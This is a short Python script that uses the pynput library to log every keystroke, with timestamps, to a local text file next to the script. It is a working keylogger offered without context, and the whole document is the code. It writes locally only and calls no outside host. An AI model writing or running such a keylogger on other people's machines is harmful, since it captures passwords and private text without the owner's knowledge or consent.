from pynput.keyboard import Listener
from pathlib import Path
import logging

LOGFILE = Path("another_keystrokes_local.log")

current_dir = Path(__file__).resolve().parent
log_path = current_dir / "another_keystrokes_local.txt"


logging.basicConfig(filename = (log_path), level=logging.DEBUG, format='%(asctime)s: %(message)s')
def on_press(key):
  logging.info(str(key))
with Listener(on_press=on_press) as listener:
  listener.join()
